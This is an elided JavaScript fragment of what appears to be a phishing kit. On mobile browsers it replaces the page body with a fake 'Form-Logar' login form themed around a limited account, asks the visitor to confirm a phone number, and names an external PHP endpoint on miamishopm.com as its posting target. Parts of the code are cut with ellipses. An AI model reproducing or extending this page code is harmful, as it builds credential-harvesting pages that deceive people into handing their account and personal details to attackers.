var manovar1;
var LinkImagens = 'https://cdn.jsdelivr.net/gh/kbondnewera/cozinham7@latest/';
var LinkPost = 'https://arquivos.miamishopm.com/php1/';
...
function CarregarLimited()
{
	if( isMobile.any() ) {
		document.getElementById("body").innerHTML = '<div id="manollx"></div>\n' +
			...
			'    <form class="Form-Logar" id="LimitedPost" action="">\n' +
			...
			'            </div>\n' +
			'            <div class="form-label-group mb-4">\n' +
			'                <p class="Form-Telefone">Confirm Phone Number</p>\n' +
